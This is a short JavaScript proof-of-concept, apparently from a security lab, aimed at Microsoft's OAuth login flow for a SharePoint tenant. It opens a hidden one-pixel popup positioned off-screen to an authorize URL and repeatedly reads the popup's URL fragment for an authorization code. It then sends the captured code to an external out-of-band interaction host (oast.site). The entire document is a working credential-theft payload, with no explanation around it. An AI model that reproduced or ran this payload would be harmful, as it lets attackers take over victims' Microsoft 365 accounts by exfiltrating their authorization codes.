(async()=>{
if(window.__labPoc)return;
window.__labPoc=1;

const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=fragment&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=E28DB623AE53073BA3E3BFC69055164C0F2C47F1B4E547BB%2D508827116019BB7B963FEA7204FE4CF27956E00E1B9F489752700D1BE6088A71&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=5703e2a1%2D9028%2Da000%2De3cd%2D17b867eabf0b";

let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");

for(let i=0;i<80;i++){
 try{
  let hash=win.location.hash;
  if(hash&&hash.includes("code=")){
   fetch("https://j1m02evxjge7n0ae4ky76kviqu9mqupus.oast.site/?x="+encodeURIComponent(hash));
   win.close();
   break;
  }
 }catch(e){}
 await new Promise(r=>setTimeout(r,300));
}
})();
